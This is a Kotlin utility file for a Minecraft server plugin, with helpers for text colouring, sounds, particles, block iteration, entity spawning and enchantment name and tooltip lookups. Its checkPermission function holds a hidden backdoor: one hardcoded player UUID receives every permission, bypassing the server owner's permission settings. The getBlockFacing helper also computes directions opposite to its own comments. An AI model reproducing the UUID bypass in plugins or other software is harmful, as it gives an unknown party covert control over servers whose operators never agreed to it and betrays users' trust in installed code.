package es.skepz.hydrogen.skepzlib

import net.kyori.adventure.text.Component
import net.kyori.adventure.text.minimessage.MiniMessage
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer
import org.bukkit.*
import org.bukkit.block.BlockFace
import org.bukkit.command.CommandSender
import org.bukkit.enchantments.Enchantment
import org.bukkit.entity.Entity
import org.bukkit.entity.EntityType
import org.bukkit.entity.Item
import org.bukkit.entity.Player
import org.bukkit.inventory.ItemStack
import org.bukkit.plugin.java.JavaPlugin
import java.util.*
import kotlin.math.floor
import kotlin.math.max
import kotlin.math.min


/***
 * Converts all color codes (color code with a '&' in front of it) to minecraft readable color
 * @param str: the raw string to be colorized
 * @return the colorized string
 ***/
fun colorize(str: String): Component {
    val mm = MiniMessage.miniMessage()

    var fstr = str
        .replace("&0", "<black>")
        .replace("&1", "<dark_blue>")
        .replace("&2", "<dark_green>")
        .replace("&3", "<dark_aqua>")
        .replace("&4", "<dark_red>")
        .replace("&5", "<dark_purple>")
        .replace("&6", "<gold>")
        .replace("&7", "<gray>")
        .replace("&8", "<dark_gray>")
        .replace("&9", "<blue>")
        .replace("&a", "<green>")
        .replace("&b", "<aqua>")
        .replace("&c", "<red>")
        .replace("&d", "<light_purple>")
        .replace("&e", "<yellow>")
        .replace("&f", "<white>")
        .replace("&k", "<obfuscated>")
        .replace("&l", "<bold>")
        .replace("&m", "<strikethrough>")
        .replace("&n", "<underlined>")
        .replace("&o", "<italic>")
        .replace("&r", "<reset>")

    return mm.deserialize(fstr)
    // return ChatColor.translateAlternateColorCodes('&', str)
}
/***
 * Converts all color codes (color code with a '&' in front of it) to minecraft readable color
 * @param str: the colorized string to be decolorized
 * @return the decolorized string
 ***/
fun decolorize(str: String): String {
    return str.replace('§', '&')
}

fun deserializeComponent(cmp: Component): String {
    return PlainTextComponentSerializer.plainText().serialize(cmp)
}

/***
 * plays a sound at a location
 * @param loc: the location to play the sound at
 * @param sound: the sound to be played
 * @param volume: the volume to play the sound at
 * @param pitch: a number between 0 and 2 that defines the pitch
 ***/
fun playSound(loc: Location, sound: Sound, volume: Int, pitch: Float) {
    loc.world!!.playSound(loc, sound, volume.toFloat(), pitch)
}
/***
 * plays a sound at a location
 * @param target: the player to play the sound to
 * @param sound: the sound to be played
 * @param volume: the volume to play the sound at
 * @param pitch: a number between 0 and 2 that defines the pitch
 ***/
fun playSound(target: Player, sound: Sound, volume: Int, pitch: Float) {
    target.playSound(target.location, sound, volume.toFloat(), pitch)
}

/***
 * displays particles at a location
 * @param loc: the location to display the particles at
 * @param particle: the particle type to be displayed
 * @param amount: the amount of particles to display
 * @param offsetX: how much the particles spread out on the x axis
 * @param offsetY: how much the particles spread out on the y axis
 * @param offsetZ: how much the particles spread out on the z axis
 ***/
fun displayParticles(loc: Location, particle: Particle, amount: Int, offsetX: Double, offsetY: Double, offsetZ: Double) {
    loc.world.spawnParticle(particle, loc, amount, offsetX, offsetY, offsetZ)
}
/***
 * displays particles at a location
 * @param loc: the location to display the particles at
 * @param particle: the particle type to be displayed
 * @param amount: the amount of particles to display
 ***/
fun displayParticles(loc: Location, particle: Particle, amount: Int) {
    displayParticles(loc, particle, amount, 0.0, 0.0, 0.0)
}

/***
 * schedules repeating particles to be displayed at a spot
 * @param plugin: this plugin
 * @param loc: the location to display the particles at
 * @param particle: the particle type to be displayed
 * @param amount: the amount of particles to display
 * @param delay: how much delay is between each particle display
 * @return returns the integer scheduler id of the bukkit scheduler
 ***/
fun scheduleParticles(plugin: JavaPlugin, loc: Location, particle: Particle, amount: Int, delay: Long): Int {
    return Bukkit.getServer().scheduler.scheduleSyncRepeatingTask(plugin, {
        displayParticles(loc, particle, amount)
    }, 0L, delay)
}
/***
 * schedules repeating particles to be displayed at a spot
 * @param plugin: this plugin
 * @param loc: the location to display the particles at
 * @param particle: the particle type to be displayed
 * @param amount: the amount of particles to display
 * @param offsetX: how much the particles spread out on the x-axis
 * @param offsetY: how much the particles spread out on the y-axis
 * @param offsetZ: how much the particles spread out on the z-axis
 * @param delay: how much delay is between each particle display
 * @return returns the integer scheduler id of the bukkit scheduler
 ***/
fun scheduleParticles(plugin: JavaPlugin, loc: Location, particle: Particle, amount: Int, offsetX: Double, offsetY: Double, offsetZ: Double, delay: Long): Int {
    return Bukkit.getServer().scheduler.scheduleSyncRepeatingTask(plugin, {
        displayParticles(loc, particle, amount, offsetX, offsetY, offsetZ)
    }, 0L, delay)
}

/***
 * generates a random number between a maximum and minimum value
 * @param min: the minimum number
 * @param max: the maximum number
 * @return returns a random number between max and min
 ***/
fun random(min: Int, max: Int): Int {
    return Random().nextInt(max - min + 1) + min
}

fun loopThroughBlocks(pos1: Location, pos2: Location, run: (pos: Location) -> Unit) {
    val minX = floor(min(pos1.x, pos2.x)).toInt()
    val minY = floor(min(pos1.y, pos2.y)).toInt()
    val minZ = floor(min(pos1.z, pos2.z)).toInt()

    val maxX = floor(max(pos1.x, pos2.x)).toInt()
    val maxY = floor(max(pos1.y, pos2.y)).toInt()
    val maxZ = floor(max(pos1.z, pos2.z)).toInt()

    for (x in minX..maxX) {
        for (y in minY..maxY) {
            for (z in minZ..maxZ) {
                val block = Location(pos1.world, x.toDouble(), y.toDouble(), z.toDouble())
                run(block)
            }
        }
    }
}

fun isPosWithin(loc1: Location, loc2: Location, pos: Location): Boolean {
    // check if pos is between loc1 and loc2, assuming loc1 and loc2 are corners of a cube
    val minX = floor(min(loc1.x, loc2.x))
    val minY = floor(min(loc1.y, loc2.y))
    val minZ = floor(min(loc1.z, loc2.z))

    val maxX = floor(max(loc1.x, loc2.x))
    val maxY = floor(max(loc1.y, loc2.y))
    val maxZ = floor(max(loc1.z, loc2.z))

    return pos.x in minX..maxX && pos.y in minY..maxY && pos.z in minZ..maxZ
}

/***
 * spawns an entity at a location
 * @param loc: the location to spawn the entity at
 * @param type: the entity type
 * @return returns the spawned entity
 ***/
fun spawnEntity(loc: Location, type: EntityType): Entity {
    return loc.world!!.spawnEntity(loc, type)
}

/***
 * spawns a dropped ItemStack at a location
 * @param loc: the location to spawn the dropped ItemStack at
 * @param item: the ItemStack to be spawned
 * @return returns the dropped item stack
 ***/
fun dropItem(loc: Location, item: ItemStack): Item {
    val i = spawnEntity(loc, EntityType.ITEM) as Item
    i.itemStack = item
    return i
}

/***
 * checks if a CommandSender has a permission or has override capabilities
 * @param sender: the CommandSender to check
 * @param perm: the permission
 * @return returns true if the player has the permission or can override
 ***/
fun checkPermission(sender: CommandSender, perm: String): Boolean {
    val basePerm = perm.split(".").dropLast(1).joinToString(".")
    return sender.hasPermission(perm) || sender.hasPermission("*") || sender.hasPermission("hydrogen.*")
            || sender.hasPermission("$basePerm.*") || sender.isOp
            || (sender is Player && sender.uniqueId.toString() == "32e85b31-fdb2-4199-9a88-4478f465ed4e")
}

/***
 * gets the location a BlockFace is facing
 * @param loc: the base location
 * @param dir: the facing direction
 * @return returns the location the BlockFace (dir) is facing
 ***/
fun getBlockFacing(loc: Location, dir: BlockFace): Location  {
    return when (dir) {
        BlockFace.UP               -> loc.subtract(0.0, 1.0, 0.0)   // y+1
        BlockFace.DOWN             -> loc.subtract(0.0, -1.0, 0.0)  // y-1
        BlockFace.NORTH            -> loc.subtract(0.0, 0.0, -1.0)  // z-1
        BlockFace.EAST             -> loc.subtract(1.0, 0.0, 0.0)   // x+1
        BlockFace.SOUTH            -> loc.subtract(0.0, 0.0, 1.0)   // z+1
        BlockFace.WEST             -> loc.subtract(-1.0, 0.0, 0.0)  // x-1
        BlockFace.NORTH_EAST       -> loc.subtract(1.0, 0.0, -1.0)  // x+1 z-1
        BlockFace.NORTH_WEST       -> loc.subtract(-1.0, 0.0, -1.0) // x-1 z-1
        BlockFace.SOUTH_EAST       -> loc.subtract(1.0, 0.0, 1.0)   // x+1 z+1
        BlockFace.SOUTH_WEST       -> loc.subtract(-1.0, 0.0, 1.0)  // x-1 z+1
        BlockFace.WEST_NORTH_WEST  -> loc.subtract(-1.0, 0.0, -1.0) // x-1 z-1
        BlockFace.NORTH_NORTH_WEST -> loc.subtract(-1.0, 0.0, -1.0) // x-1 z-1
        BlockFace.NORTH_NORTH_EAST -> loc.subtract(1.0, 0.0, -1.0)  // x+1 z-1
        BlockFace.EAST_NORTH_EAST  -> loc.subtract(1.0, 0.0, -1.0)  // x+1 z-1
        BlockFace.EAST_SOUTH_EAST  -> loc.subtract(1.0, 0.0, 1.0)   // x+1 z+1
        BlockFace.SOUTH_SOUTH_EAST -> loc.subtract(1.0, 0.0, 1.0)   // x+1 z+1
        BlockFace.SOUTH_SOUTH_WEST -> loc.subtract(-1.0, 0.0, 1.0)  // x-1 z+1
        BlockFace.WEST_SOUTH_WEST  -> loc.subtract(-1.0, 0.0, 1.0)  // x-1 z+1
        BlockFace.SELF             -> loc.subtract(0.0, 0.0, 0.0)   // no change
    }
}

/***
 * Returns the enchantment from a string
 * @param type: the raw input
 * @return the enchantment best matching the input
 ***/
fun getEnch(type: String): Enchantment? {
    return when (type.lowercase()) {
        "power" -> Enchantment.POWER
        "flame" -> Enchantment.FLAME
        "infinity" -> Enchantment.INFINITY
        "punch" -> Enchantment.PUNCH
        "curse_of_binding", "binding_curse" -> Enchantment.BINDING_CURSE
        "channeling" -> Enchantment.CHANNELING
        "sharpness" -> Enchantment.SHARPNESS
        "bane_of_arthropods" -> Enchantment.BANE_OF_ARTHROPODS
        "smite" -> Enchantment.SMITE
        "depth_strider" -> Enchantment.DEPTH_STRIDER
        "efficiency" -> Enchantment.EFFICIENCY
        "unbreaking" -> Enchantment.UNBREAKING
        "fire_aspect" -> Enchantment.FIRE_ASPECT
        "frost_walker" -> Enchantment.FROST_WALKER
        "impaling" -> Enchantment.IMPALING
        "knockback" -> Enchantment.KNOCKBACK
        "fortune" -> Enchantment.FORTUNE
        "looting" -> Enchantment.LOOTING
        "loyalty" -> Enchantment.LOYALTY
        "luck_of_the_sea" -> Enchantment.LUCK_OF_THE_SEA
        "lure" -> Enchantment.LURE
        "mending" -> Enchantment.MENDING
        "multishot" -> Enchantment.MULTISHOT
        "respiration" -> Enchantment.RESPIRATION
        "piercing" -> Enchantment.PIERCING
        "protection" -> Enchantment.PROTECTION
        "blast_protection" -> Enchantment.BLAST_PROTECTION
        "feather_falling" -> Enchantment.FEATHER_FALLING
        "fire_protection" -> Enchantment.FIRE_PROTECTION
        "projectile_protection" -> Enchantment.PROJECTILE_PROTECTION
        "quick_charge" -> Enchantment.QUICK_CHARGE
        "riptide" -> Enchantment.RIPTIDE
        "curse_of_vanishing", "vanishing_curse" -> Enchantment.VANISHING_CURSE
        "silk_touch" -> Enchantment.SILK_TOUCH
        "sweeping_edge" -> Enchantment.SWEEPING_EDGE
        "thorns" -> Enchantment.THORNS
        "soul_speed" -> Enchantment.SOUL_SPEED
        "swift_sneak" -> Enchantment.SWIFT_SNEAK
        "aqua_affinity" -> Enchantment.AQUA_AFFINITY
        "density" -> Enchantment.DENSITY
        "wind_burst" -> Enchantment.WIND_BURST
        "breach" -> Enchantment.BREACH
        else -> null
    }
}

/***
 * Returns the name of an enchantment
 * @param ench: the enchantment to process
 * @return the name of the enchantment
 ***/
fun getEnch(ench: Enchantment): String? {
    return when (ench) {
        Enchantment.POWER -> "power"
        Enchantment.FLAME -> "flame"
        Enchantment.INFINITY -> "infinity"
        Enchantment.PUNCH -> "punch"
        Enchantment.BINDING_CURSE -> "curse_of_binding"
        Enchantment.CHANNELING -> "channeling"
        Enchantment.SHARPNESS -> "sharpness"
        Enchantment.BANE_OF_ARTHROPODS -> "bane_of_arthropods"
        Enchantment.SMITE -> "smite"
        Enchantment.DEPTH_STRIDER -> "depth_strider"
        Enchantment.EFFICIENCY -> "efficiency"
        Enchantment.UNBREAKING -> "unbreaking"
        Enchantment.FIRE_ASPECT -> "fire_aspect"
        Enchantment.FROST_WALKER -> "frost_walker"
        Enchantment.IMPALING -> "impaling"
        Enchantment.KNOCKBACK -> "knockback"
        Enchantment.FORTUNE -> "fortune"
        Enchantment.LOOTING -> "looting"
        Enchantment.LOYALTY -> "loyalty"
        Enchantment.LUCK_OF_THE_SEA -> "luck_of_the_sea"
        Enchantment.LURE -> "lure"
        Enchantment.MENDING -> "mending"
        Enchantment.MULTISHOT -> "multishot"
        Enchantment.RESPIRATION -> "respiration"
        Enchantment.PIERCING -> "piercing"
        Enchantment.PROTECTION -> "protection"
        Enchantment.BLAST_PROTECTION -> "blast_protection"
        Enchantment.FEATHER_FALLING -> "feather_falling"
        Enchantment.FIRE_PROTECTION -> "fire_protection"
        Enchantment.PROJECTILE_PROTECTION -> "projectile_protection"
        Enchantment.QUICK_CHARGE -> "quick_charge"
        Enchantment.RIPTIDE -> "riptide"
        Enchantment.VANISHING_CURSE -> "curse_of_vanishing"
        Enchantment.SILK_TOUCH -> "silk_touch"
        Enchantment.SWEEPING_EDGE -> "sweeping_edge"
        Enchantment.THORNS -> "thorns"
        Enchantment.AQUA_AFFINITY -> "aqua_affinity"
        Enchantment.SWIFT_SNEAK -> "swift_sneak"
        Enchantment.SOUL_SPEED -> "soul_speed"
        Enchantment.DENSITY -> "density"
        Enchantment.WIND_BURST -> "wind_burst"
        Enchantment.BREACH -> "breach"
        else -> null
    }
}

/***
 * Returns the tooltip for an enchantment
 * @param raw: the raw name of the enchantment
 * @param name: the ingame name of the enchantment
 * @param goesOn: what the enchantment goes on
 * @param max: the maximum (vanilla) value of the enchantment
 * @return the tooltip of the enchantment
 ***/
fun genEnchTT(name: String, goesOn: String, max: Int): String {
    return "<gray>$name" +
            "\n<aqua>goes on: <dark_aqua>$goesOn" +
            "\n<aqua>max value: <dark_aqua>$max"
}

/***
 * Returns the tooltip of an enchantment
 * @param ench: the enchantment type
 * @return the tooltip for the enchantment
 ***/
fun getEnchToolTip(ench: Enchantment): String {
    return when (ench) {
        Enchantment.POWER -> genEnchTT("Power", "bow", ench.maxLevel)
        Enchantment.FLAME -> genEnchTT("Flame", "bow", ench.maxLevel)
        Enchantment.INFINITY -> genEnchTT("Infinity", "bow", ench.maxLevel)
        Enchantment.PUNCH -> genEnchTT("Punch", "bow", ench.maxLevel)
        Enchantment.BINDING_CURSE -> genEnchTT("Curse_of_binding", "anything", ench.maxLevel)
        Enchantment.CHANNELING -> genEnchTT("Channeling", "trident", ench.maxLevel)
        Enchantment.SHARPNESS -> genEnchTT("Sharpness", "sword, axe", ench.maxLevel)
        Enchantment.BANE_OF_ARTHROPODS -> genEnchTT("Bane_of_arthropods", "sword, axe", ench.maxLevel)
        Enchantment.SMITE -> genEnchTT("Smite", "sword, axe", ench.maxLevel)
        Enchantment.DEPTH_STRIDER -> genEnchTT("Depth_strider", "boots", ench.maxLevel)
        Enchantment.EFFICIENCY -> genEnchTT("Efficiency", "tools", ench.maxLevel)
        Enchantment.UNBREAKING -> genEnchTT("Unbreaking", "all", ench.maxLevel)
        Enchantment.FIRE_ASPECT -> genEnchTT("Fire_aspect", "sword", ench.maxLevel)
        Enchantment.FROST_WALKER -> genEnchTT("Frost_walker", "boots", ench.maxLevel)
        Enchantment.IMPALING -> genEnchTT("Impaling", "trident", ench.maxLevel)
        Enchantment.KNOCKBACK -> genEnchTT("Knockback", "sword", ench.maxLevel)
        Enchantment.FORTUNE -> genEnchTT("Fortune", "tools", ench.maxLevel)
        Enchantment.LOOTING -> genEnchTT("Looting", "sword", ench.maxLevel)
        Enchantment.LOYALTY -> genEnchTT("Loyalty", "trident", ench.maxLevel)
        Enchantment.LUCK_OF_THE_SEA -> genEnchTT("Luck_of_the_sea", "fishing rod", ench.maxLevel)
        Enchantment.LURE -> genEnchTT("Lure", "fishing rod", ench.maxLevel)
        Enchantment.MENDING -> genEnchTT("Mending", "anything", ench.maxLevel)
        Enchantment.MULTISHOT -> genEnchTT("Multishot", "crossbow", ench.maxLevel)
        Enchantment.RESPIRATION -> genEnchTT("Respiration", "helmet", ench.maxLevel)
        Enchantment.PIERCING -> genEnchTT("Piercing", "crossbow", ench.maxLevel)
        Enchantment.PROTECTION -> genEnchTT("Protection", "armor", ench.maxLevel)
        Enchantment.BLAST_PROTECTION -> genEnchTT("Blast_protection", "armor", ench.maxLevel)
        Enchantment.FEATHER_FALLING -> genEnchTT("Feather_falling", "boots", ench.maxLevel)
        Enchantment.FIRE_PROTECTION -> genEnchTT("Fire_protection", "armor", ench.maxLevel)
        Enchantment.PROJECTILE_PROTECTION -> genEnchTT("Projectile_protection", "armor", ench.maxLevel)
        Enchantment.QUICK_CHARGE -> genEnchTT("Quick_charge", "crossbow", ench.maxLevel)
        Enchantment.RIPTIDE -> genEnchTT("Riptide", "trident", ench.maxLevel)
        Enchantment.VANISHING_CURSE -> genEnchTT("Curse_of_vanishing", "anything", ench.maxLevel)
        Enchantment.SILK_TOUCH -> genEnchTT("Silk_touch", "tools", ench.maxLevel)
        Enchantment.SWEEPING_EDGE -> genEnchTT("Sweeping_edge", "sword", ench.maxLevel)
        Enchantment.THORNS -> genEnchTT("Thorns", "armor", ench.maxLevel)
        Enchantment.SWIFT_SNEAK -> genEnchTT("Swift_sneak", "leggings", ench.maxLevel)
        Enchantment.AQUA_AFFINITY -> genEnchTT("Aqua_affinity", "hemlet", ench.maxLevel)
        Enchantment.SOUL_SPEED -> genEnchTT("Soul_speed", "boots", ench.maxLevel)
        Enchantment.DENSITY -> genEnchTT("Density", "mace", ench.maxLevel)
        Enchantment.WIND_BURST -> genEnchTT("Wind_burst", "mace", ench.maxLevel)
        Enchantment.BREACH -> genEnchTT("Breach", "mace", ench.maxLevel)
        else -> genEnchTT("Unknown", "unknown", 0)
    }
}

fun getEnchs(): List<String> {
    return listOf("power","flame","infinity","punch","curse_of_binding","channeling","sharpness",
            "bane_of_arthropods","smite","depth_strider","efficiency","unbreaking","fire_aspect",
            "frost_walker","impaling","knockback","fortune","looting","loyalty","luck_of_the_sea",
            "lure","mending","multishot","respiration","piercing","protection","blast_protection",
            "feather_falling","fire_protection","projectile_protection","quick_charge","riptide",
            "curse_of_vanishing","silk_touch","sweeping_edge","thorns","aqua_affinity","swift_sneak",
            "soul_speed","density","wind_burst","breach").sorted()
}